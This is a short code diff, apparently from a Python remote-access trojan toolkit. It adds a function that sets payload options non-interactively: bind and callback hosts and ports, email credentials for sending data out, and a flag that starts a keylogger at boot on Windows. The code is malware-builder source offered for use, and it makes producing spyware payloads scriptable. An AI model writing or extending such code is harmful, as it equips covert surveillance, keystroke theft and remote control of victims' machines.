@@ -119,6 +119,26 @@ def create_new_config():
 
     return confirm_config()
 
+def set_payload_config(bind=True, bhost='0.0.0.0', bport='4040',
+                       listen=False, lhost='', lport='',
+                       email='None', email_pwd='', keylogger_boot=False,
+                       section='Windows'):
+    """
+    Programmatically set payload configuration without interactive prompts.
+    """
+    stini = stitch_ini()
+    stini.section = section
+    stini.set_value('BIND', str(bool(bind)))
+    stini.set_value('BHOST', str(bhost))
+    stini.set_value('BPORT', str(bport))
+    stini.set_value('LISTEN', str(bool(listen)))
+    stini.set_value('LHOST', str(lhost))
+    stini.set_value('LPORT', str(lport))
+    stini.set_value('EMAIL', str(email))
+    stini.set_value('EMAIL_PWD', str(email_pwd))
+    stini.set_value('KEYLOGGER_BOOT', str(bool(keylogger_boot)))
+    return True
+
 def confirm_config(auto_confirm=False):
     clear_screen()
     print_st_config()
